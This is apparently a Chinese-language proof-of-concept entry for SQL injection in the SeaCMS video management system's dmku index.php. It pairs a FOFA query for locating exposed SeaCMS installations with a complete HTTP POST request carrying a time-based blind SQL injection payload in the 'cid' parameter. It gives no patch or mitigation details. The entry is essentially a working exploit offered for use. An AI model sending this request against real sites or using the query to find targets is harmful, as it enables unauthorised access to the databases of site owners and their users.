# SeaCMS海洋影视管理系统index.php存在SQL注入漏洞

SeaCMS海洋影视管理系统index.php存在SQL注入漏洞，攻击者可获取数据库敏感数据。

## fofa

```yaml
app="海洋CMS"
```

## poc

```java
POST /js/player/dmplayer/dmku/index.php?ac=edit HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
Accept-Ldwk: bG91ZG9uZ3dlbmt1
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 56

cid=(select(1)from(select(sleep(6)))x)&text=1&color=1
```

